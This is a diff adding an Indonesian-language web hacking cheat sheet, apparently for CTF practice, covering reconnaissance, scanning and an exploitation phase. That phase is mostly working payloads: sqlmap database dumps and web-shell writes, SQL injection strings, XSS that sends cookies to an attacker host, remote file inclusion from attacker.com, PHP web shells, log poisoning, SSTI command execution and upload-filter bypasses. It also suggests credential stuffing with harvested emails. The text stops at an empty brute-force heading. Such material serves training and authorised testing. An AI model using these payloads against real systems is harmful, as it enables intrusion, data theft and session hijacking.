@@ -1,0 +1,1518 @@
+
+PHASE 1: RECONNAISSANCE (Pengumpulan Informasi)
+═══════════════════════════════════════════════════════════════════════════════
+
+1.1 BASIC INFORMATION GATHERING
+────────────────────────────────
+
+whatweb https://target.com
+Penjelasan: 
+- Menampilkan CMS, bahasa pemrograman (PHP, ASP, dll), web server, dan versinya
+- Cari versi lama yang punya CVE
+
+whatweb -v https://target.com
+Penjelasan: Verbose mode, lebih detail tentang headers dan info teknologi
+
+curl -I https://target.com
+Penjelasan:
+- -I = hanya lihat header (tidak download body)
+- Cari: X-Powered-By, Server version, X-Frame-Options, X-Content-Type-Options
+- Indikator keamanan buruk = banyak header yang kebocoran
+
+curl -A "Mozilla/5.0" https://target.com/robots.txt
+Penjelasan:
+- robots.txt = file yang memberi tahu crawler apa yang boleh diakses
+- Sering admin hanya menaruh folder penting di sini (tanpa sadar kita lihat)
+
+curl https://target.com/sitemap.xml
+Penjelasan:
+- sitemap.xml = list semua halaman website
+- Gunakan untuk mencari halaman yang tidak terlihat
+
+curl https://target.com/.well-known/
+Penjelasan:
+- .well-known = folder standard untuk informasi aplikasi
+- Cek: .well-known/security.txt, .well-known/acme-challenge, dll
+
+cat /proc/sys/net/ipv4/ip_local_port_range
+Penjelasan: Cek range port yang tersedia
+
+─────────────────────────────────────────────────────────────────────────────
+
+1.2 DNS ENUMERATION (DNS = Domain Name System)
+────────────────────────────────────────────────
+
+nslookup target.com
+Penjelasan: Dasar DNS lookup, tanya ke default nameserver
+
+dig target.com
+Penjelasan: Tool lebih detail dari nslookup
+
+dig target.com ANY
+Penjelasan: 
+- ANY = tampilkan semua tipe record (A, MX, TXT, NS, SOA, dll)
+- Hasil: IP address, mail servers, nameservers
+
+dig target.com A
+Penjelasan: Hanya A record (IPv4 address)
+
+dig target.com AAAA
+Penjelasan: IPv6 address (kadang diabaikan)
+
+dig target.com MX
+Penjelasan:
+- MX = Mail eXchange server
+- Berguna untuk social engineering atau email enumeration
+- Lihat domain mail-nya (mungkin ada subdomain baru)
+
+dig target.com TXT
+Penjelasan:
+- TXT records sering berisi: SPF, DKIM, DMARC, Google verification
+- Kadang admin malas & taruh credentials di sini (bahaya!)
+- Cek juga: v=spf1 (SPF record bisa bocor informasi infrastruktur)
+
+dig target.com NS
+Penjelasan:
+- NS = Nameserver
+- Cek siapa yang manage DNS (CloudFlare, AWS, GoDaddy, dll)
+- Jika pakai shared hosting = lebih mudah cari vulnerabilities
+
+dig target.com SOA
+Penjelasan:
+- SOA = Start of Authority
+- Info: Serial number, refresh time, retry time, expire time
+- Berguna untuk DNS transfer attacks
+
+dig target.com +trace
+Penjelasan:
+- +trace = tampilkan full DNS resolution path (root → TLD → nameserver)
+- Gunakan untuk detect DNS hijacking atau poisoning
+- Lihat juga di mana nameserver sebenarnya
+
+dnsenum target.com -o output.txt
+Penjelasan:
+- Full DNS enumeration (lebih lengkap dari dig)
+- Coba zone transfer (sangat bahaya kalau berhasil)
+- Butuh waktu lama
+
+dnsrecon -d target.com
+Penjelasan: Alternatif dnsenum, lebih cepat
+
+─────────────────────────────────────────────────────────────────────────────
+
+1.3 SUBDOMAIN ENUMERATION
+─────────────────────────
+
+subfinder -d target.com -o subdomains.txt
+Penjelasan:
+- Cari semua subdomain (api.target.com, admin.target.com, mail.target.com, dll)
+- Gunakan passive enumeration (tidak trigger IDS/WAF)
+- Output: list subdomain yang valid
+
+subfinder -d target.com -silent | sort -u
+Penjelasan: Silent mode, remove duplicates dengan sort
+
+assetfinder target.com
+Penjelasan: Tool lain untuk subdomain discovery (lebih cepat)
+
+amass enum -d target.com -passive
+Penjelasan:
+- Amass = comprehensive subdomain enumeration
+- -passive = tidak scan aktif, hanya gather informasi
+
+cat subdomains.txt | while read subdomain; do dig $subdomain +short; done
+Penjelasan: Resolve semua subdomain ke IP address
+
+─────────────────────────────────────────────────────────────────────────────
+
+1.4 WHOIS LOOKUP & SSL CERTIFICATE
+──────────────────────────────────
+
+whois target.com
+Penjelasan:
+- Cek registrar, registrant email, admin contact
+- Cari email yang bisa dipakai untuk password reset
+- Lihat creation date & expiration date
+
+whois <IP_ADDRESS>
+Penjelasan: Cek siapa owner IP address
+
+openssl s_client -connect target.com:443
+Penjelasan:
+- Lihat SSL certificate
+- Cari: Subject Alternative Names (SAN) = subdomain lain
+- Lihat juga issuer, expiration date
+
+openssl s_client -connect target.com:443 | openssl x509 -text
+Penjelasan: Parse certificate ke format readable
+
+curl -I https://target.com 2>/dev/null | grep -i certificate
+Penjelasan: Cari informasi sertifikat dari header
+
+─────────────────────────────────────────────────────────────────────────────
+
+1.5 HISTORICAL DATA & WAYBACK MACHINE
+──────────────────────────────────────
+
+curl "https://archive.org/wayback/available?url=target.com&output=json" | jq
+Penjelasan:
+- Lihat snapshot website dari berbagai tahun
+- Cari endpoint lama yang mungkin masih aktif
+- Cek perubahan teknologi/CMS dari waktu ke waktu
+
+waybackurls target.com | head -20
+Penjelasan: Tool untuk extract URLs dari archive.org
+
+curl "https://www.bing.com/search?q=site:target.com" 2>/dev/null
+Penjelasan: Bing indexing (kadang lebih lengkap dari Google)
+
+site:target.com (Google dorking)
+Penjelasan: Gunakan search operator di Google untuk enumerate
+
+─────────────────────────────────────────────────────────────────────────────
+
+1.6 EMAIL ENUMERATION
+─────────────────────
+
+theHarvester -d target.com -b all -l 100
+Penjelasan:
+- -d = domain
+- -b = source (google, bing, linkedin, yahoo, dll)
+- -l = limit results
+- Output: email list (gunakan untuk credential stuffing atau OSINT)
+
+grep -oE "[a-zA-Z0-9._%+-]+@target.com" /tmp/harvester_results.txt
+Penjelasan: Extract email dari hasil
+
+─────────────────────────────────────────────────────────────────────────────
+
+PHASE 1 CHECKLIST:
+☐ Teknologi website diketahui (CMS, framework, version)
+☐ Subdomain enumeration selesai
+☐ DNS records dikumpulkan
+☐ Possible email addresses dikumpulkan
+☐ Historical data dicek
+☐ SSL certificate info didapat
+
+═══════════════════════════════════════════════════════════════════════════════
+PHASE 2: PORT SCANNING & SERVICE ENUMERATION
+═══════════════════════════════════════════════════════════════════════════════
+
+2.1 BASIC NMAP SCAN
+────────────────────
+
+nmap -sC -sV -Pn target.com -oN nmap_basic.txt
+Penjelasan:
+- -sC = script scan (jalankan default script)
+- -sV = version detection
+- -Pn = assume host online (skip ping)
+- -oN = output normal format
+- Hasil: port open, service, version
+
+nmap -sS -sV -Pn target.com -oN nmap_stealth.txt
+Penjelasan:
+- -sS = SYN scan (lebih stealth, tidak establish full connection)
+- Lebih lambat tapi tidak trigger logging secanggih full connection
+
+nmap -sV -Pn -p- target.com -oN nmap_all_ports.txt
+Penjelasan:
+- -p- = scan semua 65535 port (butuh waktu lama!)
+- Gunakan kalau port default tidak ketemu apa-apa
+
+nmap -sV -Pn -p 1-10000 target.com
+Penjelasan: Scan port 1-10000 saja (lebih cepat dari semua)
+
+─────────────────────────────────────────────────────────────────────────────
+
+2.2 VULNERABILITY DETECTION
+────────────────────────────
+
+nmap -Pn --script vuln target.com
+Penjelasan:
+- Jalankan semua vulnerability scripts
+- WARNING: Bisa LAMA dan sering false positive
+- Lebih baik skip ini, fokus exploitation manual
+
+nmap -Pn --script http-enum target.com
+Penjelasan:
+- Enumerate HTTP methods yang tersedia
+- Cek PUT, DELETE, CONNECT (dangerous methods)
+
+─────────────────────────────────────────────────────────────────────────────
+
+2.3 SERVICE-SPECIFIC SCANS
+────────────────────────────
+
+# ============ MYSQL (Port 3306) ============
+nmap --script mysql-info -p 3306 target.com
+Penjelasan: Cek versi MySQL dan informasi server
+
+nmap --script mysql-empty-password -p 3306 target.com
+Penjelasan:
+- Cek apakah MySQL bisa login tanpa password
+- CRITICAL jika hasil: "authentication possible without password"
+
+nmap --script mysql-users -p 3306 target.com
+Penjelasan: Enumerate MySQL users (butuh credentials)
+
+# ============ SSH (Port 22) ============
+nmap --script ssh-hostkey -p 22 target.com
+Penjelasan: Cek SSH hostkey (bisa identify OS)
+
+nmap --script ssh2-enum-algos -p 22 target.com
+Penjelasan: Cek algoritma yang didukung SSH
+
+# ============ FTP (Port 21) ============
+nmap --script ftp-anon -p 21 target.com
+Penjelasan:
+- Cek FTP anonymous login
+- Jika berhasil: dapat akses file tanpa credentials
+
+nmap --script ftp-bounce -p 21 target.com
+Penjelasan: Cek FTP bounce vulnerability
+
+# ============ SMB/Windows (Port 445) ============
+nmap --script smb-enum-shares -p 445 target.com
+Penjelasan: Enumerate SMB shares (Windows file sharing)
+
+nmap --script smb-os-discovery -p 445 target.com
+Penjelasan: Cek OS Windows version
+
+nmap --script smb-vuln-ms17-010 -p 445 target.com
+Penjelasan: Cek EternalBlue vulnerability (kritical!)
+
+# ============ LDAP (Port 389) ============
+nmap --script ldap-search -p 389 target.com
+Penjelasan: Enumerate LDAP (Active Directory)
+
+# ============ HTTP/HTTPS (Port 80/443) ============
+nmap --script http-methods -p 80,443 target.com
+Penjelasan: Cek HTTP methods (PUT, DELETE, CONNECT)
+
+nmap --script ssl-enum-ciphers -p 443 target.com
+Penjelasan: Cek SSL/TLS cipher suites (cari yang lemah)
+
+nmap --script ssl-cert -p 443 target.com
+Penjelasan: Extract SSL certificate info
+
+nmap --script http-robots.txt -p 80,443 target.com
+Penjelasan: Extract robots.txt
+
+─────────────────────────────────────────────────────────────────────────────
+
+PHASE 2 CHECKLIST:
+☐ Port open diketahui
+☐ Service dan version terdeteksi
+☐ MySQL/database port checked
+☐ SSH/FTP/SMB checked (jika ada)
+☐ HTTP methods enumerated
+☐ SSL certificate info gathered
+
+═══════════════════════════════════════════════════════════════════════════════
+PHASE 3: WEB ENUMERATION (Directory, File, Parameter)
+═══════════════════════════════════════════════════════════════════════════════
+
+3.1 DIRECTORY BRUTE FORCE
+──────────────────────────
+
+dirsearch -u https://target.com -e php,asp,aspx,txt,env,bak,old,conf,sql,zip,backup -t 50
+Penjelasan:
+- -u = URL target
+- -e = extensions (cari file dengan extension ini)
+- -t = threads (semakin banyak semakin cepat tapi bisa detect)
+- Common findings: /admin, /phpmyadmin, /config.php, /.env, /backup.zip
+
+dirsearch -u https://target.com -w /usr/share/wordlists/dirb/common.txt
+Penjelasan: Gunakan custom wordlist
+
+dirsearch -u https://target.com --skip-bad-extensions
+Penjelasan: Skip extension yang biasanya tidak ditemukan
+
+ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403 -t 80
+Penjelasan:
+- FUZZ = posisi yang di-fuzz
+- -mc = match codes (hanya tampilkan response code ini)
+- -t = threads
+- Lebih cepat dari dirsearch, lebih flexible
+
+ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302 -fc 404
+Penjelasan:
+- -fc = filter codes (abaikan response code ini)
+- Lebih bersih, tidak tampilkan 404
+
+─────────────────────────────────────────────────────────────────────────────
+
+3.2 SENSITIVE FILE DISCOVERY
+─────────────────────────────
+
+# Cari secara manual atau dengan pattern:
+curl https://target.com/.env
+curl https://target.com/config.php
+curl https://target.com/wp-config.php
+curl https://target.com/database.php
+curl https://target.com/settings.php
+curl https://target.com/.git/config
+curl https://target.com/.github/workflows/deploy.yml
+
+# Atau gunakan ffuf untuk enumerate:
+ffuf -u https://target.com/FUZZ -w sensitive-files.txt -mc 200
+
+# Common sensitive files:
+- .env, .env.local, .env.example
+- config.php, settings.php, database.php, app.php
+- wp-config.php (WordPress)
+- .git/config, .git/HEAD, .gitconfig
+- .docker/config.json
+- id_rsa, id_rsa.pub (SSH keys)
+- .aws/credentials
+- phpmyadmin/, admin/, superadmin/
+- backup.zip, backup.tar.gz, backup.sql
+- database.sql, dump.sql
+- composer.lock (reveal library versions)
+- package-lock.json, requirements.txt (reveal dependencies)
+
+─────────────────────────────────────────────────────────────────────────────
+
+3.3 PARAMETER DISCOVERY
+────────────────────────
+
+ffuf -u 'https://target.com/search?FUZZ=test' -w /usr/share/wordlists/paramspider/params.txt -mc 200
+Penjelasan:
+- Discover hidden parameters di URL
+- Contoh: id, user, admin, debug, test, cmd, system
+
+# Manual testing:
+https://target.com/page?id=1
+https://target.com/page?user=1
+https://target.com/page?admin=1
+https://target.com/page?debug=1
+https://target.com/page?test=1
+
+─────────────────────────────────────────────────────────────────────────────
+
+3.4 VIRTUAL HOST DISCOVERY
+───────────────────────────
+
+ffuf -u https://FUZZ.target.com -w /usr/share/wordlists/subdomains-top1million-5000.txt -mc 200,301,302
+Penjelasan:
+- Cari virtual host (berbeda domain, same IP)
+- Hasil: api.target.com, admin.target.com, internal.target.com, dll
+
+ffuf -u https://FUZZ.target.com -w /usr/share/wordlists/subdomains-top1million-5000.txt -fc 404,400
+Penjelasan: Filter 404 (not found) dan 400 (bad request)
+
+─────────────────────────────────────────────────────────────────────────────
+
+3.5 API ENDPOINT DISCOVERY
+───────────────────────────
+
+ffuf -u https://target.com/api/FUZZ -w /usr/share/wordlists/api-common.txt -mc 200,201,400
+Penjelasan:
+- Cari endpoint API
+- Common: /api/users, /api/login, /api/v1/, /api/admin, dll
+
+ffuf -u https://target.com/api/v1/FUZZ -w common-api-endpoints.txt
+Penjelasan: Cari specific API endpoints
+
+waybackurls target.com | grep -i api | sort -u
+Penjelasan: Gunakan archive untuk cari API lama
+
+─────────────────────────────────────────────────────────────────────────────
+
+3.6 TECHNOLOGY & FRAMEWORK DETECTION
+─────────────────────────────────────
+
+whatweb -v https://target.com
+Penjelasan: Verbose technology detection
+
+curl -s https://target.com | grep -i "wp-content\|wp-includes" | head -5
+Penjelasan: Quick check untuk WordPress
+
+curl -s https://target.com | grep -i "joomla\|administrator"
+Penjelasan: Quick check untuk Joomla
+
+curl -s https://target.com | head -30
+Penjelasan: Lihat header HTML (sering ada tech hints)
+
+─────────────────────────────────────────────────────────────────────────────
+
+PHASE 3 CHECKLIST:
+☐ Direktori penting ditemukan (/admin, /api, /phpmyadmin, dll)
+☐ File sensitif dicari (.env, config.php, .git, dll)
+☐ Parameter tersembunyi di-enumerate
+☐ API endpoints ditemukan
+☐ Virtual host dicek
+☐ Technology stack diketahui detail
+
+═══════════════════════════════════════════════════════════════════════════════
+PHASE 4: EXPLOITATION (Teknik-teknik Serangan)
+═══════════════════════════════════════════════════════════════════════════════
+
+4.1 SQL INJECTION (SQLi) - PALING UMUM DI CTF
+───────────────────────────────────────────────
+
+4.1.1 AUTOMATED EXPLOITATION WITH SQLMAP
+──────────────────────────────────────────
+
+# Basic scan:
+sqlmap -u "https://target.com/page.php?id=1" --batch --dbs --risk 3 --level 5
+
+Penjelasan Command:
+- -u = URL target (harus ada parameter yang di-test)
+- --batch = otomatis jawab yes/no pertanyaan
+- --dbs = tampilkan semua database
+- --risk 3 = level risiko (1-3, semakin tinggi semakin agresif)
+- --level 5 = level deteksi (1-5, semakin tinggi semakin thorough)
+
+# Untuk POST request:
+sqlmap -u "https://target.com/login.php" --data="username=admin&password=pass" --dbs
+
+# Dengan cookie:
+sqlmap -u "https://target.com/profile.php?id=1" --cookie="PHPSESSID=abc123" --dbs
+
+# Cari tables:
+sqlmap -u "https://target.com/page.php?id=1" -D database_name --tables
+
+Penjelasan:
+- -D = nama database
+- --tables = tampilkan semua tables dalam database
+- Hasil: users, posts, comments, products, dll
+
+# Cari kolom:
+sqlmap -u "https://target.com/page.php?id=1" -D database_name -T users --columns
+
+Penjelasan:
+- -T = table name
+- --columns = tampilkan semua kolom dalam table
+- Hasil: id, username, password, email, admin, dll
+
+# Dump data:
+sqlmap -u "https://target.com/page.php?id=1" -D database_name -T users --dump
+
+Penjelasan:
+- --dump = export semua data dalam table
+- Hasil: credentials, emails, personal data, dll
+
+# Dump semua:
+sqlmap -u "https://target.com/page.php?id=1" --dump-all
+
+# Untuk phpMyAdmin:
+sqlmap -u "https://target.com/phpmyadmin/index.php" --forms --dbs --batch
+
+Penjelasan:
+- --forms = otomatis detect dan exploit form di halaman
+
+# Cari file:
+sqlmap -u "https://target.com/page.php?id=1" --file-read="/etc/passwd"
+
+Penjelasan:
+- --file-read = baca file dari server
+- Result: isi file ditampilkan
+
+# Write shell:
+sqlmap -u "https://target.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
+
+Penjelasan:
+- --file-write = upload file ke server
+- --file-dest = lokasi di server
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.1.2 MANUAL SQL INJECTION TESTING
+───────────────────────────────────
+
+# Jika sqlmap tidak bekerja, coba manual:
+
+# Basic test (detection):
+https://target.com/page.php?id=1 AND 1=1     # Should load normally
+https://target.com/page.php?id=1 AND 1=2     # Should give error or different page
+
+# Boolean-based (blind SQLi):
+https://target.com/page.php?id=1' AND '1'='1    # Should work
+https://target.com/page.php?id=1' AND '1'='2    # Should fail
+
+# Comment syntax:
+' OR 1=1 --
+' OR 1=1 #
+" OR 1=1 --
+
+# UNION-based (jika errornya tampil):
+' UNION SELECT NULL,NULL,NULL --       # Adjust column count
+' UNION SELECT 1,2,3 --
+' UNION SELECT username,password FROM users --
+
+# Time-based (blind SQLi - response lama):
+; SELECT SLEEP(5) --
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --
+
+# Contoh vulnerable URL:
+https://target.com/page.php?id=1' UNION SELECT NULL,username,password FROM users --
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.1.3 ADVANCED: OPERATING SYSTEM COMMAND EXECUTION
+───────────────────────────────────────────────────
+
+# MySQL ke RCE (jika MySQL server punya FILE privileges):
+sqlmap -u "https://target.com/page.php?id=1" --os-shell
+
+# Manual:
+' UNION SELECT 1,2,3,4 INTO OUTFILE '/var/www/html/shell.php' --
+
+# MSSQL:
+'; EXEC xp_cmdshell 'dir'; --
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.2 CROSS-SITE SCRIPTING (XSS) - SERING DIPERLUKAN UNTUK EXPLOIT LAIN
+──────────────────────────────────────────────────────────────────────
+
+4.2.1 RECONNAISSANCE XSS
+──────────────────────────
+
+# Cari semua input fields:
+curl -s https://target.com | grep -i "<input\|<textarea\|<select"
+
+# Cari form:
+curl -s https://target.com | grep -i "<form"
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.2.2 REFLECTED XSS (di URL)
+─────────────────────────────
+
+# Test 1: Basic payload
+https://target.com/search?q=<script>alert('XSS')</script>
+
+# Test 2: Image onerror
+https://target.com/search?q=<img src=x onerror=alert('XSS')>
+
+# Test 3: dengan encoding
+https://target.com/search?q=%3Cscript%3Ealert('XSS')%3C/script%3E
+
+# Test 4: SVG
+https://target.com/search?q=<svg onload=alert('XSS')>
+
+# Test 5: Event handler
+https://target.com/search?q=" onmouseover="alert('XSS')"
+
+Result kalau vulnerable:
+- Alert box muncul
+- JavaScript code executed
+- Cookies bisa dicuri (document.cookie)
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.2.3 STORED XSS (di database)
+───────────────────────────────
+
+# Cari di form (komentar, profile, post, dll):
+Payload: <script>alert('XSS')</script>
+
+# Atau:
+Payload: <img src=x onerror=alert('XSS')>
+
+# Atau:
+Payload: "><svg onload=alert('XSS')>
+
+# Kalau berhasil:
+- Payload tersimpan di database
+- Setiap orang yang load halaman = XSS tereksekusi
+- BAHAYA untuk steal cookies pengguna lain (admin, dll)
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.2.4 DOM XSS (Client-side JavaScript vulnerability)
+──────────────────────────────────────────────────────
+
+# Cek source code HTML (View Page Source):
+- Cari: document.location, innerHTML, eval(), etc.
+- Test dengan payload di URL
+
+# Contoh vulnerable code:
+var id = new URLSearchParams(window.location.search).get('id');
+document.getElementById('result').innerHTML = id;  // ← VULNERABLE!
+
+# Exploit:
+https://target.com/page?id=<img src=x onerror=alert('XSS')>
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.2.5 ADVANCED: COOKIE STEALING DENGAN XSS
+────────────────────────────────────────────
+
+# Buat listener (di attacker machine):
+python3 -m http.server 8080
+
+# Payload untuk inject:
+<script>
+fetch('http://ATTACKER_IP:8080/steal?cookie='+document.cookie);
+</script>
+
+# Atau lebih simple:
+<img src=x onerror="fetch('http://ATTACKER_IP:8080/steal?c='+document.cookie)">
+
+# Kalau berhasil:
+- Admin akan klik link dengan payload
+- Cookie admin ter-capture di attacker server
+- Gunakan cookie untuk hijack session admin
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.2.6 XSS FILTER BYPASS
+────────────────────────
+
+# Kalau <script> di-block:
+<img src=x onerror=alert('XSS')>
+"><svg onload=alert('XSS')>
+<iframe src="javascript:alert('XSS')"></iframe>
+<body onload=alert('XSS')>
+<marquee onstart=alert('XSS')>
+
+# Kalau alert di-block:
+<img src=x onerror="fetch('http://attacker.com')">
+<img src=x onerror="document.location='http://attacker.com'">
+
+# Case variation:
+<ScRiPt>alert('XSS')</ScRiPt>
+<SCRIPT>alert('XSS')</SCRIPT>
+
+# HTML encode:
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+
+# Event handlers variation:
+onmouseover= onmouseenter= onmouseleave= onmousedown= onmouseup=
+onload= onerror= onclick= ondblclick= oncontextmenu=
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.3 LOCAL FILE INCLUSION (LFI) - File Read Vulnerability
+───────────────────────────────────────────────────────────
+
+4.3.1 BASIC LFI TESTING
+───────────────────────
+
+# Test sederhana:
+https://target.com/page.php?file=index.php
+https://target.com/page.php?file=../../../etc/passwd
+https://target.com/page.php?file=../../windows/win.ini
+
+# Jika ada response berbeda = potentially vulnerable
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.3.2 DIRECTORY TRAVERSAL PAYLOADS
+───────────────────────────────────
+
+# Unix/Linux:
+../../../etc/passwd
+../../etc/shadow
+../../../var/log/apache2/access.log
+../../../var/log/auth.log
+../../../proc/self/environ
+../../../proc/self/cwd
+
+# Windows:
+..\..\windows\win.ini
+..\..\windows\system32\drivers\etc\hosts
+..\..\boot.ini
+
+# PHP specific:
+../../../var/www/html/config.php
+../../../var/www/html/wp-config.php
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.3.3 ENCODING BYPASS
+──────────────────────
+
+# Double dot slash:
+....//....//....//etc/passwd
+
+# URL encoding:
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%252f..%252fetc%252fpasswd
+
+# Backslash (Windows):
+..\..\..\windows\win.ini
+
+# Unicode:
+%c0%ae%c0%ae%c0%aeetc%c0%aepasswd
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.3.4 PHP WRAPPER EXPLOITATION
+────────────────────────────────
+
+# Base64 encode file content:
+https://target.com/page.php?file=php://filter/convert.base64-encode/resource=index.php
+Result: base64 encoded content ditampilkan (no code execution)
+
+# Decode:
+echo "PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTsgPz4=" | base64 -d
+
+# Read multiple files:
+php://filter/convert.base64-encode/resource=/var/www/html/config.php
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.3.5 LFI TO RCE (FILE UPLOAD + LOG POISONING)
+────────────────────────────────────────────────
+
+# Step 1: Upload file dengan PHP code
+# Upload melalui form upload atau find if upload exists
+
+# Step 2: Jika upload di log folder yang readable:
+https://target.com/page.php?file=../../../var/log/apache2/access.log
+
+# Step 3: Inject PHP code melalui User-Agent:
+curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" https://target.com
+
+# Step 4: Access log file:
+https://target.com/page.php?file=../../../var/log/apache2/access.log&cmd=id
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.3.6 LFI TO RCE (UPLOAD FILE METHOD)
+──────────────────────────────────────
+
+# Step 1: Upload file (jika ada upload functionality)
+Filename: shell.php
+Content: <?php system($_GET['cmd']); ?>
+
+# Step 2: Cari lokasi file upload
+Biasanya: /uploads/, /files/, /images/, dll
+
+# Step 3: Akses via LFI:
+https://target.com/page.php?file=../uploads/shell.php?cmd=id
+
+# Step 4: Execute command:
+https://target.com/page.php?file=../uploads/shell.php&cmd=whoami
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.4 REMOTE FILE INCLUSION (RFI) - Execute remote PHP
+──────────────────────────────────────────────────────
+
+# RFI Test:
+https://target.com/page.php?file=http://attacker.com/shell.php
+
+# Setup attacker server:
+python3 -m http.server 8080
+
+# Create shell.php:
+<?php system($_GET['cmd']); ?>
+
+# Access:
+https://target.com/page.php?file=http://ATTACKER_IP:8080/shell.php?cmd=id
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.5 INSECURE DIRECT OBJECT REFERENCE (IDOR)
+──────────────────────────────────────────────
+
+4.5.1 IDOR TESTING
+────────────────
+
+# Cari parameter ID:
+https://target.com/user/profile?id=1
+https://target.com/document/view?doc_id=123
+https://target.com/order?order_id=5000
+
+# Test dengan ID berbeda:
+https://target.com/user/profile?id=2
+https://target.com/user/profile?id=3
+https://target.com/user/profile?id=admin
+
+# Kalau bisa access data user lain tanpa auth = IDOR vulnerable
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.5.2 IDOR AUTOMATION
+──────────────────────
+
+# Dengan ffuf:
+ffuf -u 'https://target.com/user/profile?id=FUZZ' -w <(seq 1 100) -mc 200
+
+# Dengan burp intruder:
+1. Set payload position pada ID
+2. Gunakan number payload (1-100)
+3. Intruder → start attack
+4. Lihat mana yang berbeda
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.6 CROSS-SITE REQUEST FORGERY (CSRF)
+────────────────────────────────────────
+
+4.6.1 CSRF DETECTION
+─────────────────────
+
+# Cek form untuk CSRF token:
+curl -s https://target.com/admin/delete-user | grep -i "csrf\|token"
+
+# Kalau tidak ada token di form = vulnerable CSRF
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.6.2 EXPLOIT CSRF
+────────────────────
+
+# Buat malicious HTML (host di attacker server):
+<html>
+<body onload="document.forms[0].submit()">
+<form action="https://target.com/admin/delete-user" method="POST">
+    <input type="hidden" name="user_id" value="1">
+    <input type="submit" value="Click here">
+</form>
+</body>
+</html>
+
+# Jika admin klik link = user dengan ID 1 terhapus
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.7 XML EXTERNAL ENTITY (XXE) INJECTION
+─────────────────────────────────────────
+
+4.7.1 XXE FILE READ
+────────────────────
+
+# Setup payload:
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+
+# Send ke target (jika ada XML upload/processing):
+curl -X POST -H "Content-Type: application/xml" -d @xxe.xml https://target.com/upload
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.7.2 XXE RCE (KALAU PERINTAH TERSEDIA)
+──────────────────────────────────────────
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
+<foo>&xxe;</foo>
+
+# Atau:
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
+<foo>&xxe;</foo>
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.8 SERVER-SIDE TEMPLATE INJECTION (SSTI)
+───────────────────────────────────────────
+
+4.8.1 SSTI DETECTION
+─────────────────────
+
+# Testing payloads:
+{{ 7*7 }}           # Jinja2
+${7*7}              # Erb, Mako
+<%= 7*7 %>          # Erb
+{{7*7}}             # Twig
+[[7*7]]             # Velocity
+
+# Kalau result = 49 → SSTI vulnerable
+
+# Test di URL:
+https://target.com/page?name={{ 7*7 }}
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.8.2 SSTI RCE (JINJA2)
+────────────────────────
+
+# File read:
+{{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate() }}
+
+# OS command execution:
+{{ ''.__class__.__mro__[1].__subclasses__()[416]('id',shell=True,stdout=-1).communicate() }}
+
+# Simpler version (burp):
+{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.9 FILE UPLOAD VULNERABILITIES
+──────────────────────────────────
+
+4.9.1 UPLOAD SHELL.PHP DIRECTLY
+────────────────────────────────
+
+# Create shell:
+<?php system($_GET['cmd']); ?>
+
+# Save sebagai: shell.php
+
+# Upload melalui form
+
+# Access:
+https://target.com/uploads/shell.php?cmd=whoami
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.9.2 BYPASS EXTENSION CHECK
+──────────────────────────────
+
+# Change extension:
+shell.php    →    shell.php5
+shell.php    →    shell.phtml
+shell.php    →    shell.phar
+shell.php    →    shell.php7
+shell.php    →    shell.phps
+shell.php    →    shell.shtml
+
+# Server config .htaccess:
+AddType application/x-httpd-php .jpg
+Result: .jpg files executed as PHP
+
+# Upload .htaccess terlebih dahulu:
+<FilesMatch "\.jpg$">
+    AddType application/x-httpd-php .jpg
+</FilesMatch>
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.9.3 BYPASS MIME TYPE CHECK
+──────────────────────────────
+
+# Ubah Content-Type:
+Original: Content-Type: application/x-php
+Changed to: Content-Type: image/jpeg
+
+# Upload shell.php dengan Content-Type: image/jpeg
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.9.4 POLYGLOT FILES
+──────────────────────
+
+# Create valid image + PHP code:
+cp /usr/share/pixmaps/debian-logo.png shell.php
+echo '<?php system($_GET["cmd"]); ?>' >> shell.php
+
+# Upload as shell.php
+# File valid image & PHP code
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.10 AUTHENTICATION BYPASS
+──────────────────────────
+
+4.10.1 DEFAULT CREDENTIALS
+────────────────────────────
+
+admin:admin
+admin:password
+admin:123456
+test:test
+root:root
+guest:guest
+
+# Try di: /admin, /phpmyadmin, /cpanel, /login, etc.
+
+─────────────────────────────────────────────────────────────────────────────
+
+4.10.2 BRUTE FORCE LOGIN
+─────────────────────────
+
